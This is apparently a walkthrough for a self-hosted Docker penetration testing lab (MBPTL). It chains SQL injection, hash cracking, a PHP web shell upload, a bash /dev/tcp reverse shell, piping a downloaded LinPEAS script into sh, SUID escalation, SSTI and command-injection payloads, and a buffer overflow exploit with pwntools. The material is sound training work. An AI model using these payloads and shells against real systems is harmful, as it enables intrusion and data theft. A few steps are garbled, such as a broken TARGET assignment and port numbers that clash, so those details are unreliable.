# Write Up: Most Basic Penetration Testing Labs (MBPTL)
***Self-deployed straightforward hacking lab machine designed for newcomers who want to learn Penetration Testing, running inside Docker for easy setup.***

**Repository:** *https://github.com/bayufedra/MBPTL/*

**Author:** *Fedra Bayu*

> **Target IP:** In this lab: `172.19.0.2` (Docker internal) | Real-world equivalent: `103.31.33.37` (public IP)

## 🎯 Quick Start Guide

### For the Impatient
```bash
# 1. Start the lab
cd MBPTL/mbptl/
docker-compose up -d

# 2. Access the Kali attack container
docker exec -it -u kali attacker-kali bash

# 3. Set your target
export TARGET=172.19.0.2

# 4. Follow the writeup below!
```

### Understanding This Lab
This lab simulates a real-world penetration testing scenario using Docker containers. While we use internal Docker IPs (like `172.19.0.2`), the methodology is identical to testing real external IPs. The key difference is that in a real engagement, you would:
- Start with a domain name or public IP
- Perform OSINT and reconnaissance to discover your targets
- Work within the scope defined by your client

In this lab, we'll use realistic discovery techniques to find our targets on the Docker network, simulating an internal network penetration test.

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Vulnerability Analysis](#vulnerability-analysis)
3. [Exploitation](#exploitation)
4. [Post-Exploitation](#post-exploitation)
5. [Pivoting](#pivoting)

## Prerequisites
Before starting this lab, ensure you have the following tools installed:
- Kali Linux or similar penetration testing distribution (or use the included `attacker-kali` container)
- Basic knowledge of Linux command line
- Understanding of web application vulnerabilities

## Understanding Lab vs Real-World Environments

### 🌐 Real-World Reconnaissance
Before we dive into the lab, it's crucial to understand how target identification works in real penetration testing:

#### External Penetration Test (Black Box)
In a real-world external test, you typically start with:

**Given Information:**
- Company name: "ACME Corporation"
- Domain: `www.acme-corp.com`
- Scope of engagement (what you CAN test)

**Your Discovery Process:**

1. **DNS Lookup** - Find IPs behind domains:
```bash
nslookup acme-corp.com
# Returns: 203.45.67.89

host acme-corp.com
# acme-corp.com has address 203.45.67.89
```

2. **WHOIS Lookup** - Identify network ranges:
```bash
whois acme-corp.com
# NetRange: 203.45.67.0 - 203.45.67.255
# Organization: ACME Corp
```

3. **Subdomain Enumeration** - Find additional targets:
```bash
subfinder -d acme-corp.com
amass enum -d acme-corp.com
# Discovers: admin.acme-corp.com, dev.acme-corp.com, mail.acme-corp.com
```

4. **ASN/Network Discovery** - Find entire IP blocks:
```bash
whois -h whois.radb.net -- '-i origin AS12345'
```

#### Internal Penetration Test
For internal tests with network access:

1. **Identify Your Network**:
```bash
ip addr show
# You're on: 192.168.10.50/24
```

2. **Network Discovery**:
```bash
# Find all live hosts on your subnet
nmap -sn 192.168.10.0/24

# Check ARP table for recently contacted hosts
arp -a

# View routing table for other network segments
route -n
```

3. **Service Discovery**:
```bash
# Scan for web servers, databases, etc.
nmap -sV 192.168.10.0/24
```

### 🧪 This Lab Environment
In this Docker-based lab, we simulate a real-world scenario with some convenient shortcuts:

**Docker Networking:**
- Each container gets an internal IP (e.g., 172.19.0.2)
- Containers can resolve each other by service name
- The lab exposes certain ports to `localhost` for external access

**Two Ways to Approach This Lab:**

1. **Realistic Mode** - Discover the network first:
```bash
# Find your network
ip addr show

# Discover all hosts
nmap -sn 172.19.0.0/24

# Scan discovered IPs
nmap 172.19.0.2
```

2. **Convenient Mode** - Use Docker service names:
```bash
# Docker DNS resolution
nmap mbptl-main  # Resolves to 172.19.0.2
```

**For this writeup, we'll use the realistic approach to mirror real-world methodology.**

---

## Reconnaissance

### Phase 1: Network Discovery

First, let's understand what network we're on and discover potential targets.

#### Access the Attack Container
```bash
# Start the lab
docker-compose up -d

# Access the Kali attack container
docker exec -it -u kali attacker-kali bash
```

#### Discover Your Network
```bash
# Check your network interface
ip addr show eth0
```

**Expected Output:**
```
inet 172.19.0.5/16 brd 172.19.255.255 scope global eth0
```

This tells us we're on the `172.19.0.0/16` network.

#### Host Discovery
```bash
# Scan for live hosts on the network
nmap -sn 172.19.0.0/24
```

**Expected Output:**
```
Nmap scan report for 172.19.0.1
Host is up (0.000010s latency).

Nmap scan report for mbptl-main.mbptl_default (172.19.0.2)
Host is up (0.000020s latency).

Nmap scan report for mbptl-app.mbptl_default (172.19.0.3)
Host is up (0.000020s latency).

Nmap scan report for mbptl-internal.mbptl_default (172.19.0.4)
Host is up (0.000020s latency).

Nmap done: 256 IP addresses (4 hosts up) scanned in 2.5 seconds
```

**Analysis:** We've discovered 3 target hosts on the network. Let's investigate the most interesting one first: `172.19.0.2`

### Phase 2: Port Scanning

Port scanning is the first step to identify open services on discovered hosts. Nmap is the industry standard tool for this purpose.

#### Set Target Variable
For convenience, let's set our primary target:
```bash
export TARGET=nmap -sn 172.19.0.0/24
echo "Target set to: $TARGET"
```

#### Basic Port Scan
```bash
nmap $TARGET
```

#### Basic Port Scan
```bash
nmap $TARGET
```

#### Results
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-01-01 00:00 UTC
Nmap scan report for mbptl-main.mbptl_default (172.19.0.2)
Host is up (0.0000020s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

**Analysis:** We discovered two HTTP services running on ports 80 and 8080, indicating web applications are accessible.

> **Note:** In the original writeup, the target IP is shown as `103.31.33.37` to simulate a real external IP address. In this Docker lab environment, we use the actual container IP `172.19.0.2`. The methodology remains identical - you're simply working with internal network addresses instead of public ones.

### Phase 3: Service Enumeration
### Phase 3: Service Enumeration

HTTP response headers often contain valuable information about the server configuration, technologies used, and potential vulnerabilities. We'll use `curl` to gather this information.

**Note:** The `curl` tool is pre-installed in the `attacker-kali` container. In a real scenario on your own system, you would install it with `sudo apt install curl`.

#### Enumerate Port 80
We'll use the `-I` flag to retrieve only the response headers:
```bash
curl -I http://$TARGET/
```

#### Port 80 Results
```
HTTP/1.1 200 OK
Date: Thu, 07 Mar 2024 14:38:43 GMT
Server: Apache/2.4.52 (Debian)
X-Powered-By: PHP/7.3.33
Content-Type: text/html; charset=UTF-8
```

#### Enumerate Port 8080
```bash
curl -I http://$TARGET:8080/
```

#### Port 8080 Results
```
HTTP/1.1 200 OK
Date: Thu, 07 Mar 2024 14:39:31 GMT
Server: Apache/2.4.52 (Debian)
Last-Modified: Tue, 27 Feb 2024 14:40:33 GMT
ETag: "804-6125e02396e80"
Accept-Ranges: bytes
Content-Length: 2052
Vary: Accept-Encoding
Content-Type: text/html
```

**Analysis:** Both services run Apache 2.4.52 on Debian. Port 80 uses PHP 7.3.33, while port 8080 appears to serve static content.

### Phase 4: Directory Enumeration
### Phase 4: Directory Enumeration

Since we found HTTP services, we can discover hidden directories and files using directory scanning tools. We'll use `dirsearch` as it's beginner-friendly and effective.

**Note:** Dirsearch is pre-installed in `~/tools/dirsearch/` in the `attacker-kali` container.

#### Navigate to Tools Directory
```bash
cd ~/tools/dirsearch
```

#### Scan Port 80
```bash
python3 dirsearch.py -u http://$TARGET/
```

**Alternative using the pre-configured alias:**
```bash
dirsearch -u http://$TARGET/
```

#### Port 80 Results
```
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722

Output: /home/kali/tools/dirsearch/reports/http_172.19.0.2/__24-03-07_21-12-21.txt

Target: http://172.19.0.2/

[21:12:21] Starting:
[21:14:19] 301 -  314B  - /img  ->  http://172.19.0.2/img/
[21:14:19] 301 -  314B  - /inc  ->  http://172.19.0.2/inc/

Task Completed
```

#### Scan Port 8080
```bash
dirsearch -u http://$TARGET:8080/
```

#### Port 8080 Results
```
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722

Output: /home/kali/tools/dirsearch/reports/http_172.19.0.2_8080/__24-03-07_21-20-24.txt

Target: http://172.19.0.2:8080/

[21:20:24] Starting:
[21:21:26] 301 -  331B  - /administrator  ->  http://172.19.0.2:8080/administrator/
[21:21:26] 200 -    2KB - /administrator/
[21:21:26] 200 -    2KB - /administrator/index.php

Task Completed
```

**Analysis:** We discovered several interesting directories:
- Port 80: `/img` and `/inc` directories
- Port 8080: `/administrator` directory with an `index.php` file

### Reconnaissance Summary

**Discovered Assets:**
| IP Address  | Hostname                    | Open Ports | Services                  | Interesting Findings |
|-------------|-----------------------------| -----------|---------------------------|----------------------|
| 172.19.0.2  | mbptl-main.mbptl_default    | 80, 8080   | Apache 2.4.52, PHP 7.3.33 | Admin panel on :8080 |
| 172.19.0.3  | mbptl-app.mbptl_default     | Unknown    | To be investigated        | Internal network     |
| 172.19.0.4  | mbptl-internal.mbptl_default| Unknown    | To be investigated        | Internal network     |

**Next Steps:**
1. Investigate web application on port 80 for vulnerabilities
2. Attempt to access administrator panel on port 8080
3. After initial compromise, pivot to internal hosts

## Vulnerability Analysis

After examining both web services, we found that port 8080 contains an administrator panel. However, the main vulnerability was discovered on port 80.

### Manual Testing for SQL Injection

While exploring the web application on port 80 (accessible at `http://$TARGET/` or from your host machine at `http://localhost/`), we noticed that clicking on items in the book list changed the URL to `detail.php?id=1`. 

**Why This Matters:**
This parameter-based URL structure is a common indicator of potential SQL injection vulnerabilities. The application is likely querying a database using this ID parameter.

#### Testing Method
```bash
# From the Kali container
curl "http://$TARGET/detail.php?id=1'"

# Or test from your browser on the host machine
# http://localhost/detail.php?id=1'
```

**Testing for SQL Injection:**
When we added a single quote (`'`) to the URL parameter (`detail.php?id=1'`), the application returned an SQL error:

```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1
```

**Analysis:** This error message confirms that:
1. The application is vulnerable to SQL injection
2. It's using MySQL as the backend database
3. User input is being directly concatenated into SQL queries without proper sanitization
4. The application has verbose error reporting enabled (information disclosure)

**Vulnerable Code Pattern (example):**
```php
// Vulnerable code that likely exists in detail.php
$id = $_GET['id'];
$query = "SELECT * FROM books WHERE id = '$id' LIMIT 1";
// When we send id=1', the query becomes:
// SELECT * FROM books WHERE id = '1'' LIMIT 1  <-- Syntax error!
```

## Exploitation

### Automated SQL Injection with SQLMap

We can exploit the SQL injection vulnerability using `sqlmap`, the most popular automated SQL injection tool. This tool can automatically detect and exploit various types of SQL injection vulnerabilities.

**Note:** SQLMap is pre-installed in `~/tools/sqlmap/` in the `attacker-kali` container.

#### Navigate to SQLMap
```bash
cd ~/tools/sqlmap
```

#### Enumerating Databases
We'll use the `--dbs` flag to list all available databases:
```bash
python3 sqlmap.py -u "http://$TARGET/detail.php?id=1" --dbs
```

**Alternative using the pre-configured alias:**
```bash
sqlmap -u "http://$TARGET/detail.php?id=1" --dbs
```

**Results:**
```
[22:19:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.52, PHP 7.3.33
back-end DBMS: MySQL >= 5.6
[22:19:30] [INFO] fetching database names
available databases [6]:
[*] administrator
[*] bookstore
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

**Analysis:** The `administrator` database looks most promising for finding credentials.

#### Dumping the Administrator Database
```bash
sqlmap -u "http://$TARGET/detail.php?id=1" -D administrator --dump
```

**Results:**
```
Database: administrator
Table: users
[1 entry]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | b9f385c68320e27d5a4ea0618eef4a94 | admin    |
+----+----------------------------------+----------+
```

**Analysis:** We successfully extracted admin credentials from the database.

### Password Cracking
The password field contains a hash value. We can crack this hash using online hash cracking services or local tools.

**Hash Analysis:**
- Hash: `b9f385c68320e27d5a4ea0618eef4a94`
- Type: MD5 (32 characters, hexadecimal)
- Cracked Password: `P@assw0rd!`

**Method:** We used https://hashes.com/en/decrypt/hash to crack the MD5 hash.

### Accessing the Administrator Panel
Now that we have valid credentials (`admin:P@assw0rd!`), we can access the administrator panel discovered on port 8080.

**Login Details:**
- URL from Kali container: `http://$TARGET:8080/administrator/` or `http://172.19.0.2:8080/administrator/`
- URL from host machine: `http://localhost:8080/administrator/`
- Username: `admin`
- Password: `P@assw0rd!`

> **Note:** You can access the web interface from your host machine's browser at `http://localhost:8080/administrator/` since the docker-compose configuration exposes port 8080 to your local machine.

### File Upload Vulnerability
After successfully logging into the administrator panel, we discovered a file upload feature. Since the application uses PHP as the backend, we can attempt to upload a malicious PHP file to gain command execution.

#### Creating a PHP Web Shell
Create a text file with the following content:
```php
<?php system($_GET["command"]); ?>
```

Save it with a `.php` extension (e.g., `shell.php`).

**Alternative Web Shell References:**
- https://github.com/bayufedra/Tiny-PHP-Webshell

#### Uploading the Shell
After uploading the file, the application responds with: `Book inserted successfully!`

#### Locating the Uploaded File
To find where the file was uploaded, we need to check the main website on port 80. By clicking "View Details" on any item and examining the broken image, we can right-click and "Open image in new tab" to see the file path.

**File Location Discovery:**
When accessing the uploaded file, we see:
```
Warning: system(): Cannot execute a blank command in /var/www/html/administrator/uploads/e77a53f1b6b4aba6d1fc86e42767ce4c.php on line 1
```

**Analysis:** The file is located at `/var/www/html/administrator/uploads/` with a randomly generated filename.

#### Command Execution
Now we can execute Linux commands by appending `?command=<command>` to the file URL.

**From the Kali container:**
```bash
curl "http://$TARGET/administrator/uploads/FILENAME.php?command=ls+-lah"
```

**From your host browser:**
```
http://localhost/administrator/uploads/FILENAME.php?command=ls -lah
```

**Example:**
```bash
http://localhost/administrator/uploads/e77a53f1b6b4aba6d1fc86e42767ce4c.php?command=ls -lah
```

**Results:**
```
total 16K
drwxrwxrwx 1 www-data www-data 4.0K Mar  7 15:32 .
drwxrwxr-x 1 root     root     4.0K Feb 27 14:40 ..
-rw-r--r-- 1 www-data www-data   34 Mar  7 15:32 e77a53f1b6b4aba6d1fc86e42767ce4c.php
-rwxrwxrwx 1 root     root     4.0K Feb 27 14:40 index.php
```

### Reading the User Flag
The flags are located in the `/flag` directory. Let's examine the directory structure:

```bash
ls -lah /flag
```

**Results:**
```
total 20K
drwxr-xr-x 1 root root 4.0K Feb 27 14:44 .
drwxr-xr-x 1 root root 4.0K Feb 27 14:46 ..
---------- 1 root root   40 Feb 27 14:40 root.txt
-rw-rw-r-- 1 root root   40 Feb 27 14:40 user.txt
```

**Reading the User Flag:**
```bash
cat /flag/user.txt
```

#### FLAG USER: USER{32250170a0dca92d53ec9624f336ca24}

**Note:** We cannot read the root flag yet as it has restrictive permissions (`----------`).

## Post-Exploitation

### Establishing a Reverse Shell
A reverse shell provides a more stable and interactive connection to the target system. It runs on the target but connects back to our attacking machine.

**Note:** Netcat is pre-installed in the `attacker-kali` container.

#### Find Your Attack Machine's IP
First, we need to know the IP address of our Kali container so the target knows where to connect back:

```bash
# Get your IP on the Docker network
ip addr show eth0 | grep "inet " | awk '{print $2}' | cut -d/ -f1
```

**Expected output:** `172.19.0.5` (or similar)

Set this as a variable:
```bash
export ATTACKER_IP=$(ip addr show eth0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
echo "Attacker IP: $ATTACKER_IP"
```

#### Setting Up a Listener
We'll use netcat to listen for incoming connections:
```bash
nc -lp 1337
```

**Open a new terminal** to create the payload while the listener runs.

#### Reverse Shell Payload
Create a new PHP file with the reverse shell payload:
```php
<?php system('bash -c "bash -i >& /dev/tcp/172.19.0.5/1337 0>&1"'); ?>
```

**Note:** Replace `172.19.0.5` with your actual `$ATTACKER_IP` discovered above.

#### Establishing the Connection
After uploading and accessing the file, we receive a reverse shell connection:

```
❯ nc -lp 1337
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@63f5b77af313:/var/www/html/administrator/uploads$
```

### Privilege Escalation

#### Reconnaissance with LinPEAS
LinPEAS is a comprehensive privilege escalation enumeration script that searches for various paths to escalate privileges on Linux systems.

**Download and Run LinPEAS:**
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Source:** https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

#### Discovering the Vulnerability
LinPEAS revealed an interesting finding in the "SUID - Check easy privesc, exploits and write perms" section:
```
You can write SUID file: /bin/bahs
```

**Analysis:** There's a typo in the system - `/bin/bahs` instead of `/bin/bash`, and it has SUID permissions with root ownership.

#### Exploiting the SUID Binary
Since `/bin/bahs` is owned by root and has SUID permissions, executing it will run with root privileges:

```bash
bahs
```

This gives us a root shell, allowing us to access the root flag.

### Reading the Root Flag
```bash
bahs
cd /flag
cat root.txt
```

#### FLAG ROOT: ROOT{bed128365216c019988915ed3add75fb}

## Pivoting

After gaining root access to the main server, we can now pivot to access the internal network and discover other machines. Pivoting is a technique used to move from one compromised system to another system that is not directly accessible from the original attack vector.

### Pivoting Setup
After gaining root access to the server, we can install additional tools for better pivoting capabilities. This setup enhances our ability to explore the internal network and maintain stable connections.

#### Installing Essential Tools
```bash
apt install -y python3 netcat nmap
```


### Spawn Interactive Shell
The current shell is likely limited and non-interactive. Here are several methods to spawn a fully interactive shell:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

### Network Discovery
From our root shell, let's discover what other systems are on the internal network:

```bash
# Check network interfaces
ip addr show

# Scan the internal network
nmap -sn 172.17.0.0/16
```

### Port Scanning Internal Hosts
We discovered that there's another container running on the internal network. Let's scan it for open ports:

```bash
# Scan the internal container (adjust IP as needed)
nmap -p- mbptl-app
```

### Accessing the Internal Service
The internal container is running a web service on port 1337. We can access it using various methods:

#### Method 1: Using curl from the compromised host
```bash
# From the root shell on the main container
curl http://mbptl-app:5000/
```

#### Method 2: Using wget
```bash
wget -qO- http://mbptl-app:5000/
```

#### Method 3: Using netcat
```bash
echo -e "GET / HTTP/1.1\r\nHost: mbptl-app:5000\r\n\r\n" | nc mbptl-app 1337
```

### Testing for Vulnerabilities
The internal service appears to be a simple Flask application. Let's test for common vulnerabilities:

```bash
# Test for command injection
curl "http://mbptl-app:5000/?name=test"
curl "http://mbptl-app:5000/?name=test';ls;'"
curl "http://mbptl-app:5000/?name=test%3Bcat%20/etc/passwd%3B"
```

### Exploiting the Internal Service
The internal service is vulnerable to Server-Side Template Injection (SSTI). We can exploit this to read files and execute commands:

```bash
# Read the flag file
curl "http://mbptl-app:5000/?name=\{\{config.items()\}\}"
curl "http://mbptl-app:5000/?name=\{\{request.application.__globals__.__builtins__.__import__('os').popen('cat+/flag.txt').read()\}\}"
```

### Alternative: Direct File Access
Since we have root access on the main container, we can also try to access the internal container's files directly through the Docker volume or by exploiting container escape techniques.

#### FLAG PIVOT: PIVOTING{b036ea40f13e3287b8e8babd5749e7cf}

## Internal Service Exploitation: mbptl-internal (Buffer Overflow)

After successfully pivoting to the internal network, we discovered a custom service running on port 31337 inside the `mbptl-internal` container. This service is a vulnerable C binary that presents an excellent opportunity for exploitation through a classic buffer overflow vulnerability.

### Initial Reconnaissance

First, let's examine the binary to understand its structure and identify potential vulnerabilities:

```bash
# Analyze the binary file
file mbptl-internal_binary
strings mbptl-internal_binary | grep -i secret
objdump -d mbptl-internal_binary | grep -A 10 -B 10 secret
```

### Binary Analysis

The binary analysis reveals several key characteristics:

1. **Architecture:** 64-bit ELF executable
2. **Protection Mechanisms:** 
   - No PIE (Position Independent Executable) - addresses are predictable
   - No stack canaries - no protection against buffer overflows
   - No ASLR (Address Space Layout Randomization) - memory layout is static
3. **Vulnerable Function:** Uses `gets()` for input, which is inherently unsafe
4. **Hidden Function:** Contains a `__secret()` function that executes `system("/bin/bash")`

### Vulnerability Analysis

#### Root Cause
The vulnerability stems from the use of the `gets()` function, which is inherently unsafe because it:
- Does not perform bounds checking
- Continues reading until a newline character is encountered
- Can easily overflow the allocated buffer

#### Memory Layout
```
Stack Layout:
+------------------+
| Local Variables  | <- 128 bytes buffer
+------------------+
| Saved RBP        | <- 8 bytes
+------------------+
| Return Address   | <- 8 bytes (target for overwrite)
+------------------+
```

#### Offset Calculation
- Buffer size: 128 bytes
- Saved RBP: 8 bytes
- **Total offset to return address: 136 bytes**

### Exploitation Methodology

#### Step 1: Identify Target Addresses
```bash
# Find the secret function address
objdump -d mbptl-internal_binary | grep secret
# Output: 00000000004011b6 <__secret>:

# Find ret gadgets for stack alignment (if needed)
objdump -d mbptl-internal_binary | grep -A 1 -B 1 "ret"
# Found ret gadget at: 0x401282
```

#### Step 2: Craft the Exploit Payload
The payload structure:
```
[136 bytes padding] + [ret gadget address] + [secret function address]
```

**Why the ret gadget?**
- Modern x86_64 systems often require 16-byte stack alignment
- The ret gadget ensures proper stack alignment before calling the target function
- This prevents potential segmentation faults due to misaligned stack

#### Step 3: Execute the Exploit

**Method 1: Python3 with struct module**
```bash
(python3 -c 'import struct, sys; sys.stdout.buffer.write(b"A"*136 + struct.pack("<Q", 0x401282) + struct.pack("<Q", 0x4011b6))'; cat -) | nc mbptl-internal 31337
```

**Method 2: Using pwntools (alternative approach)**
```python
#!/usr/bin/env python3
from pwn import *

# Set up the connection
p = remote('mbptl-internal', 31337)

# Craft the payload
payload = b"A" * 136
payload += p64(0x401282)  # ret gadget
payload += p64(0x4011b6)  # secret function

# Send the payload
p.sendline(payload)

# Get interactive shell
p.interactive()
```

### Exploitation Results

Upon successful exploitation, we gain a shell with elevated privileges:

```bash
# The exploit spawns a bash shell
$ id
uid=0(root) gid=0(root) groups=0(root)

# Read the flag
$ cat /flag.txt
FLAG{c7e0cb7880fd168f41f25e24767660f6}
```

### Technical Details

#### Why This Exploit Works
1. **No Stack Protection:** The binary lacks stack canaries, allowing us to overwrite the return address
2. **Predictable Addresses:** No PIE means function addresses are static and predictable
3. **Controlled Input:** We can send arbitrary data to overflow the buffer
4. **Useful Gadget:** The `__secret()` function provides a direct path to shell execution

#### Security Implications
This vulnerability demonstrates several critical security failures:
- Use of unsafe functions (`gets()`)
- Lack of modern security protections
- Hidden backdoor functions in production code
- Insufficient input validation

### Flag
```
FLAG{c7e0cb7880fd168f41f25e24767660f6}
```

## Conclusion

This lab demonstrates a complete penetration testing methodology covering:
- **Reconnaissance:** Port scanning, information gathering, and directory enumeration
- **Vulnerability Analysis:** Manual testing for SQL injection
- **Exploitation:** Automated SQL injection with SQLMap, password cracking, and file upload exploitation
- **Post-Exploitation:** Reverse shell establishment and privilege escalation
- **Pivoting:** Internal network discovery and lateral movement

The lab showcases common web application vulnerabilities and demonstrates how they can be chained together to achieve full system compromise.

## Lessons Learned

1. **Input Validation:** Always validate and sanitize user input to prevent SQL injection
2. **File Upload Security:** Implement proper file type validation and storage security
3. **Privilege Management:** Avoid unnecessary SUID binaries and regularly audit system permissions
4. **Network Segmentation:** Proper network isolation can prevent lateral movement
5. **Defense in Depth:** Multiple layers of security controls are essential

## Tools Used

- **Nmap:** Port scanning and service enumeration
- **Dirsearch:** Directory and file enumeration
- **SQLMap:** Automated SQL injection exploitation
- **Netcat:** Reverse shell establishment and binary exploitation
- **LinPEAS:** Privilege escalation enumeration
- **Curl:** HTTP request testing and exploitation
- **Python3:** Buffer overflow payload creation
- **Struct module:** Binary data packing for exploit development
